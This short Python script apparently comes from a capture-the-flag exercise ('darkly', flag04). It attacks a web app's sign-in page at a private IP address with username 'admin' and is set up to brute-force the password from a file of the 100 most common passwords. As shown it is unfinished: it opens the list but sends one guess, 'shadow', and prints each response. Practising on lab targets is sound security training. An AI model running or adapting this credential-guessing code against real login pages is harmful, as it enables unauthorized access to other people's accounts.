import requests
import asyncio


url = "http://10.14.200.61/index.php"


username = "admin"


password_file = "/home/wmonacho/Documents/Project_42/In_Progress_Project/darkly/flag04/100-most-common-passwords.csv"


def try_password(username, password):

    params = {
        "page": "signin",
        "username": username,
        "password": password,
        "Login": "Login"
    }
    

    response = requests.get(url, params=params)
    print(response.text)
    print(response.status_code)
    return False

def test():

    file = open(password_file, "r")
    try_password(username, "shadow")

test()